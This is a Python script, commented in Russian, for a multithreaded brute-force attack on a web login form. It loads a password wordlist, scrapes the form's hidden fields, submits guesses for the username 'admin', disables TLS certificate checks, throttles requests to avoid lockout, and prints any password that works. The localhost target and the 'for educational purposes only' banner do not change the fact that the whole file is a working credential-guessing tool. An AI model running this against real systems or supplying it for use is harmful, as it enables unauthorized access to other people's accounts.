import http.cookiejar
import queue
import urllib.request
import urllib.parse
import threading
import time
from html.parser import HTMLParser
import ssl

# Настройки
user_threads = 10
username = "admin"
wordlist_file = "cain.txt"  # Убедитесь что файл существует
resume = None

# Целевой URL (ЗАМЕНИТЕ на тестовый!)
target_url = "http://localhost:8080"  # Пример для теста
target_post = "http://localhost:8080"  # Должен быть тот же URL или правильный endpoint

username_field = "username"
password_field = "password"  # Чаще используется 'password' вместо 'passwd'

success_check = "Dashboard"  # Измените на индикатор успешного входа

# Отключение SSL проверки для тестов (НЕ использовать в продакшене!)
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

class BruteParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tag_results = {}
        
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value or ""

class Bruter:
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        self.lock = threading.Lock()
        print(f"Finished setting up for: {username}")
    
    def run_bruteforce(self):
        threads = []
        for i in range(user_threads):
            t = threading.Thread(target=self.web_bruter, daemon=True)
            threads.append(t)
            t.start()
        
        # Ожидание завершения всех потоков
        for t in threads:
            t.join()
            
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            try:
                brute = self.password_q.get(timeout=1).rstrip()
            except queue.Empty:
                break
                
            try:
                # Создаем opener с куками
                jar = http.cookiejar.CookieJar()
                opener = urllib.request.build_opener(
                    urllib.request.HTTPCookieProcessor(jar),
                    urllib.request.HTTPSHandler(context=ssl_context)
                )
                urllib.request.install_opener(opener)
                
                # Получаем страницу логина
                print(f"Trying: {self.username}:{brute} ({self.password_q.qsize()} left)")
                response = urllib.request.urlopen(target_url, timeout=10)
                page = response.read().decode('utf-8', errors='ignore')
                
                # Парсим форму
                parser = BruteParser()
                parser.feed(page)
                post_tags = parser.tag_results
                
                # Заполняем данные для входа
                post_tags[username_field] = self.username
                post_tags[password_field] = brute
                
                # Кодируем данные для POST
                login_data = urllib.parse.urlencode(post_tags).encode('utf-8')
                
                # Отправляем POST запрос
                login_response = urllib.request.urlopen(target_post, login_data, timeout=10)
                login_result = login_response.read().decode('utf-8', errors='ignore')
                
                # Проверяем успешность
                if success_check in login_result:
                    with self.lock:
                        self.found = True
                    print("[*] Bruteforce successful!")
                    print(f"[*] Username: {self.username}")
                    print(f"[*] Password: {brute}")
                    print("[*] URL:", login_response.geturl())
                    break
                    
            except urllib.error.HTTPError as e:
                print(f"HTTP Error for {brute}: {e.code}")
            except urllib.error.URLError as e:
                print(f"URL Error for {brute}: {e.reason}")
            except Exception as e:
                print(f"Error trying {brute}: {str(e)}")
            finally:
                self.password_q.task_done()
                
            # Задержка чтобы избежать блокировки
            time.sleep(0.1)

def build_wordlist(path, resume_word=None):
    """Создает очередь слов из файла"""
    q = queue.Queue()
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fd:
            found_resume = resume_word is None
            for line in fd:
                word = line.strip()
                if not word:
                    continue
                if not found_resume:
                    if word == resume_word:
                        found_resume = True
                        print(f"[*] Resuming from: {resume_word}")
                    else:
                        continue
                q.put(word)
        print(f"[*] Loaded {q.qsize()} words from {path}")
    except FileNotFoundError:
        print(f"[!] Wordlist file {path} not found!")
        # Создаем минимальный тестовый wordlist
        test_words = ["admin", "password", "123456", "test", "root"]
        for word in test_words:
            q.put(word)
        print("[*] Using test wordlist")
    return q

if __name__ == "__main__":
    print("[*] Starting bruteforce attack...")
    print("[!] FOR EDUCATIONAL PURPOSES ONLY!")
    
    words = build_wordlist(wordlist_file, resume)
    bruter_obj = Bruter(username, words)
    
    try:
        bruter_obj.run_bruteforce()
    except KeyboardInterrupt:
        print("\n[*] Bruteforce interrupted by user")
    finally:
        if not bruter_obj.found:
            print("[*] Bruteforce completed. No password found.")